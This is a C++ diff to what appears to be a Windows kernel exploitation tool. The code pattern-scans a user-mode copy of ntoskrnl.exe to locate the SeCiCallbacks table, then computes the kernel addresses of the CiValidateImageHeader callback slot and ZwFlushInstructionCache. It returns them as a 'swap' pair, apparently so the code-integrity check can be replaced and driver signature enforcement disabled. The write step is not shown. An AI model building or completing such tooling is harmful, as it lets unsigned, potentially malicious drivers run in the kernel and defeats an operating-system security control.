@@ -1,5 +1,5 @@
 #include "includes.h"
-
+#include <DbgHelp.h>
 
 bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
 {
@@ -22,7 +22,7 @@ bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
         if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {
 
             if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
-                globals::nt_base = drivers[i];
+                globals::nt_base = ( ULONG_PTR )drivers[i];
                 return true;
             }
         } else
@@ -31,96 +31,100 @@ bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
     return false; // Failed, just return false
 }
 
-
 seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
+    std::wcout << L"[*] Searching Pattern...\n";
 
-    std::wcout << ( "[*] Searching Pattern...\n" );
-
-    if ( !modules::EnumerateKernelModules( L"ntoskrnl.exe" ) ) return seCiCallbacks_swap{ 0 };
-
-    std::printf( "[*] Kernel Base Address 0x%p\n", globals::nt_base );
-
-    ULONG_PTR mod_base = ( ULONG_PTR )globals::nt_base;
-    uint8_t* test = ( uint8_t* )globals::nt_base;
-    HMODULE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
-    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
-    void* ntoskrnl_ptr = ( void* )usermode_load_va;
-
-    //Calculating the size of the loaded module
-    MODULEINFO modinfo;
-    GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) );
-    std::printf( "[*] Image Size Retrieved: %llx\n", modinfo.SizeOfImage );
-
-    uintptr_t ep = helpers::GetEntryPoint( usermode_load_va );
-    std::printf( "[*] ntoskrnl.exe Entry Point: 0x%p\n", ep );
-
-    unsigned char pattern[] = {
-        0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00
-    };
-
-    const char* mask = "xxx????";
-
-    DWORD64 seCiCallbacksInstr1 = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );
-
-    INT32 seCiCallbacksLeaOffset = *( INT32* )( seCiCallbacksInstr1 + 3 );
-
-    DWORD64 nextInstructionAddr = seCiCallbacksInstr1 + 3 + 4;
-
-    DWORD64 seCiCallbacksAddr = nextInstructionAddr + seCiCallbacksLeaOffset;
-
-    wprintf( L"[*] seCiCallbacksInstr CiCallbacks: 0x%016llX\n", seCiCallbacksInstr1 );
-    DWORD64 KernelOffset2 = 0x000000006dd87aba;
-
-    DWORD64 KernelOffset = seCiCallbacksInstr1 - uNtAddr;
-    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset );
-    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset2 );
-
-    DWORD64 kernelAddress = mod_base + KernelOffset;
-    DWORD64 kernelAddress2 = mod_base + KernelOffset;
-    wprintf( L"[*] Kernel Addr Offset: 0x%016llX\n", kernelAddress );
-    wprintf( L"[*] Kernel Addr Offset2: 0x%016llX\n", kernelAddress );
-    DWORD64 zwFlushInstructionCache = ( DWORD64 )helpers::GetProcAddress( ntoskrnl_ptr, L"ZwFlushInstructionCache" ) - uNtAddr + mod_base;
-
-    DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20; // Offset 0x20: Entry point of CiValidateImageHeader within ci.dll (nt!SeValidateImageHeader)
-
-    std::printf( "[*] ciValidateImageHeaderEntry: 0x%p\n", ciValidateImageHeaderEntry );
-
-    std::printf( "[*] zwFlushInstructionCache: 0x%p\n", zwFlushInstructionCache );
-
-    // match the pattern first (same as before)
-    DWORD64 instr_addr = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );
-    if ( !instr_addr ) {
-        std::printf( "Pattern not found.\n" );
-        return {};
+    if ( !modules::EnumerateKernelModules( L"ntoskrnl.exe" ) ) {
+        std::printf( "[!] Failed to enumerate kernel modules.\n" );
+        return seCiCallbacks_swap{ 0 };
     }
 
-    // get the first LEA instruction's offset
-    INT32 lea1_offset = *( INT32* )( instr_addr + 3 );
-    DWORD64 lea1_target = instr_addr + 7 + lea1_offset;
+    ULONG_PTR mod_base = ( ULONG_PTR )globals::nt_base;
+    std::printf( "[*] Kernel Base Address: %p (0x%llx)\n", ( void* )mod_base, ( unsigned long long )mod_base );
 
-    DWORD64 ciCallbacks = lea1_target - 0x20;
+    HINSTANCE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
+    if ( !usermode_load_va ) {
+        std::printf( "[!] Failed to load usermode ntoskrnl.exe\n" );
+        return seCiCallbacks_swap{ 0 };
+    }
+    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
+    std::printf( "[*] Usermode ntoskrnl base: %p\n", ( void* )uNtAddr );
+    MODULEINFO modinfo{};
+    if ( !GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) ) ) {
+        std::printf( "[!] Failed to get module information\n" );
+        return seCiCallbacks_swap{ 0 };
+    }
+    std::printf( "[*] Image Size: 0x%llx\n", ( unsigned long long )modinfo.SizeOfImage );
 
-    std::printf( "[+] ciCallbacks: 0x%p\n", ( void* )ciCallbacks );
+    // Find all matches for the pattern
+    unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };
+    const char* mask = "xxx????";
+    const size_t offsetAfterMatch = 4;
 
-    // Optionally resolve more entries
-    DWORD64 ciValidateImageHeaderEntry2 = *( DWORD64* )( ciCallbacks + 0x20 );
-    DWORD64 ciValidateImageDataEntry2 = *( DWORD64* )( ciCallbacks + 0x28 );
+    auto matches = helpers::find_lea_rax_patterns(
+        ( DWORD64 )usermode_load_va,
+        modinfo.SizeOfImage,
+        pattern,
+        mask,
+        offsetAfterMatch
+    );
 
-    std::printf( "[*] CiValidateImageHeader: 0x%p\n", ( void* )ciValidateImageHeaderEntry );
-    std::printf( "[*] CiValidateImageData:   0x%p\n", ( void* )ciValidateImageDataEntry2 );
+    if ( matches.empty() ) {
+        std::printf( "[!] Pattern not found\n" );
+        return seCiCallbacks_swap{ 0 };
+    }
+
+    std::printf( "[*] SeCiCallbacks usermode VA: 0x%p\n", matches[0].address );
+
+    DWORD64 offset = matches[0].address - uNtAddr;
+    std::printf( "[*] Offset in image: 0x%llx\n", offset );
+
+    DWORD64 seCiCallbacksKernel = mod_base + offset;
+    std::printf( "[*] SeCiCallbacks kernel VA: 0x%llx\n", seCiCallbacksKernel );
+
+    DWORD64 zwFlushUser = ( DWORD64 )helpers::GetProcAddress( ( void* )usermode_load_va, L"ZwFlushInstructionCache" );
+    if ( !zwFlushUser ) {
+        std::printf( "[!] Failed to get ZwFlushInstructionCache address\n" );
+        return seCiCallbacks_swap{ 0 };
+    }
+
+    DWORD64 zwFlushOffset = zwFlushUser - uNtAddr;
+    DWORD64 zwFlushKernel = mod_base + zwFlushOffset;
+    std::printf( "[*] ZwFlushInstructionCache kernel VA: 0x%llx\n", zwFlushKernel );
+
+    DWORD64 ciValidateImageHeaderEntry = seCiCallbacksKernel + 0x20;
+    std::printf( "[*] ciValidateImageHeaderEntry kernel VA: 0x%llx\n", ciValidateImageHeaderEntry );
 
     system( "pause" );
-    return seCiCallbacks_swap{ 0 };
+
+    return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushKernel };
 }
 
-uintptr_t helpers::GetEntryPoint( HMODULE moduleBase ) {
-    unsigned char* lpBase = reinterpret_cast< unsigned char* >( moduleBase );
 
-    IMAGE_DOS_HEADER* idh = reinterpret_cast< IMAGE_DOS_HEADER* >( lpBase );
-    if ( idh->e_magic != IMAGE_DOS_SIGNATURE ) return 0;
+helpers::EntryPointInfo helpers::GetEntryPoint( HMODULE moduleBase ) {
+    if ( !moduleBase )
+        return { 0, 0 };
 
-    IMAGE_NT_HEADERS64* nt = reinterpret_cast< IMAGE_NT_HEADERS64* >( lpBase + idh->e_lfanew );
-    if ( nt->Signature != IMAGE_NT_SIGNATURE ) return 0;
+    unsigned char* base = reinterpret_cast< unsigned char* >( moduleBase );
 
-    return reinterpret_cast< uintptr_t >( lpBase + nt->OptionalHeader.AddressOfEntryPoint );
+    auto* dosHeader = reinterpret_cast< IMAGE_DOS_HEADER* >( base );
+    if ( dosHeader->e_magic != IMAGE_DOS_SIGNATURE )
+        return { 0, 0 };
+
+    auto* ntHeaders = reinterpret_cast< PIMAGE_NT_HEADERS64 >( base + dosHeader->e_lfanew );
+    if ( !ntHeaders || ntHeaders->Signature != IMAGE_NT_SIGNATURE )
+        return { 0, 0 };
+
+    if ( ntHeaders->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
+        ntHeaders->OptionalHeader.SizeOfImage < 0x100000 ||
+        ntHeaders->FileHeader.NumberOfSections < 20 ) {
+        return { 0, 0 };
+    }
+
+    globals::nt_base2 = ntHeaders->OptionalHeader.ImageBase;
+
+    uintptr_t rva = ntHeaders->OptionalHeader.AddressOfEntryPoint;
+    uintptr_t absVA = reinterpret_cast< uintptr_t >( base + rva );
+
+    return { absVA, rva };
 }
